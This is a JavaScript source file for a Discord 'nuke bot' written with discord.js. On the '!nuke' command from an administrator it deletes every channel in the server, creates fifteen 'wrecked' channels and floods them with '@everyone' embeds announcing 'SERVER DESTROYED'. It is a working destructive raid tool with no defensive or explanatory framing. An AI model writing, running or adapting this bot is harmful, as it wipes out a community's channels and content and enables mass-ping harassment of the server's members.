// ===== NUKE BOT v2.0 =====
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers
  ]
});

// NUKE COMMAND
client.on('messageCreate', async message => {
  if (message.content === '!nuke' && message.member?.permissions.has('ADMINISTRATOR')) {
    // 1. Delete all channels
    message.guild.channels.cache.forEach(c => c.delete().catch(e => {}));
    
    // 2. Create spam channels
    for (let i = 0; i < 15; i++) {
      const channel = await message.guild.channels.create({
        name: `wrecked-${i}`,
        type: 0
      });
      
      // Spam embeds
      const embed = new EmbedBuilder()
        .setTitle("💣 SERVER DESTROYED")
        .setDescription(`@everyone\nGET WRECKED [${i+1}/15]`)
        .setColor("#FF0000");
      
      channel.send({ embeds: [embed] });
    }
  }
});

client.login('YOUR_TOKEN_HERE');